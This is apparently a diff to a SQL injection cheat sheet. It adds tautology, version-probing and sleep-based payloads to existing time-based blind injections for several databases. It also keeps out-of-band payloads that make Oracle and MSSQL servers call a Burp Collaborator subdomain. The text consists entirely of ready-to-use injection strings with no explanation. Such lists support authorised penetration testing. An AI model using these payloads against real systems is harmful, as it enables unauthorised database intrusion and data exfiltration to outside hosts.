@@ -48,6 +48,12 @@ IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
 SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
 
+248001'+AND+'2'='1 FALSE 
+' OR 1=1 /*
+ ‘ and substring(@@version,1,1)=1=’1'’,
+(select*from(select(sleep(40)))a)
+
+
 SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
 SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
 exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
